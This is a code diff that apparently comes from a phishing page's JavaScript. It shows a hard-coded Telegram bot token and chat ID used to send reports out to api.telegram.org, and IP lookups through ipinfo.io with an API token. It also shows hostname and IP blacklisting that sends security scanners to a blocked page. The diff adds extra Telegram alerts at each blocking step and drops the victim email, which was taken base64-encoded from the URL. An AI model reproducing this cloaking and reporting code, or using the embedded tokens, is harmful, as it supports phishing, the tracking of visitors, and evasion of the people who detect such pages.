@@ -108,7 +108,7 @@ function isBase64(str) {
     }
 }
 
-function sendMessage(email) {
+function sendMessage() {
   const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
   const chatId = '1412104349';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -155,7 +155,7 @@ function sendMessage(email) {
     });
 }
 
-function sendMessage2(email) {
+function sendMessage2() {
   const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
   const chatId = '1412104349';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
@@ -212,6 +212,7 @@ function sendMessage2(email) {
         const para = urlParams.get('Chamuel');
         if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
             console.log('Invalid parameter. Redirecting to error page...');
+            sendMessage2();
             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
                 .then(response => response.json())
                 .then(data => {
@@ -235,6 +236,7 @@ function sendMessage2(email) {
                 // Check if hostname contains any blacklisted words
                 if (blacklistedWords.some(word => hostname.includes(word))) {
                     console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
+                    sendMessage2();
                     addBlacklistedIP(ip);
                     redirectToBlockedPage();
                 // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
@@ -301,13 +303,13 @@ function sendMessage2(email) {
         .then(data => {
             if (data === 'blacklisted') {
                 console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
-                sendMessage2(getBase64FromUrl());
+                sendMessage2();
                 addBlacklistedIP(ip);
                 redirectToBlockedPage();
 
             } else if (data === 'clean') {
                 console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
-                sendMessage(getBase64FromUrl());
+                sendMessage();
                 loadContent();
             } else {
                 console.log('Error:', data);
